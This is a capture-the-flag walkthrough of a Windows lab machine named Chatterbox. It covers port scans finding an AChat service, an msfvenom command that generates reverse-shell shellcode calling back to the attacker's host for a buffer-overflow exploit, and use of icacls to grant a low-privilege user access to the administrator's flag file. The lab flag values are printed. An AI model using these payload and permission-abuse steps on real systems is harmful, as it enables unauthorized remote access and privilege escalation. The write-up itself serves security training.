# Chatterbox
>Author : Xyan1d3
>Date : 11th July 2021
>IP : 10.10.10.74
>OS : Windows
>Difficulty : Medium
# Initial Enumeration
## Nmap basic top 1000 with scripts
**This scan shows not ports open.**
## Rustscan with nmap scripts
```sql
# Nmap 7.91 scan initiated Sun Jul 11 18:31:56 2021 as: nmap -vvv -p 9255,9256 -A -oN nmap/rustscan 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up, received echo-reply ttl 127 (0.069s latency).
Scanned at 2021-07-11 18:31:56 IST for 22s

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system

Uptime guess: 0.033 days (since Sun Jul 11 17:44:12 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE (using port 9255/tcp)
HOP RTT      ADDRESS
1   69.39 ms 10.10.14.1
2   69.91 ms 10.10.10.74
```

We see that the port `9255/tcp` is running `AChat chat system`.
![[Pasted image 20210711184004.png]]

We have a `Remote Buffer Overflow` vulnerability which we could try to exploit this box.

We have to change the shellcode of the bufferoverflow to get a reverse shell on the box.
```python
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=9001 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

We replace the shellcode and run the exploit while listening on the port to get a shell on the box.
![[Pasted image 20210711214550.png]]

## Getting the user Flag
```python
C:\Users\Alfred\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Alfred\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
07/11/2021  12:04 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  19,618,828,288 bytes free

C:\Users\Alfred\Desktop>type user.txt
type user.txt
d734b1393ee1d64404c508ce1b9b102a
```

# Getting the root Flag
We see that we can get inside the `Administrator` home directory.
But, Get an `Access Denied` while reading `root.txt`.
```python
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9034-6528

 Directory of C:\Users\Administrator\Desktop

12/10/2017  07:50 PM    <DIR>          .
12/10/2017  07:50 PM    <DIR>          ..
07/11/2021  12:04 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  19,618,828,288 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
Access is denied.
```

We could list the permissions and ownerships of the `Desktop` directory and `root.txt`.

```python
C:\Users\Administrator>icacls Desktop
icacls Desktop
Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```
We see that we have `Alfred` having `Full Access` on the Desktop directory.

Now, We need to take the ownership of the file.
```python
C:\Users\Administrator\Desktop>icacls root.txt /GRANT Alfred:F
icacls root.txt /GRANT Alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files

C:\Users\Administrator\Desktop>type root.txt
type root.txt
734bd068e778e56a47048485ee16d0c9
```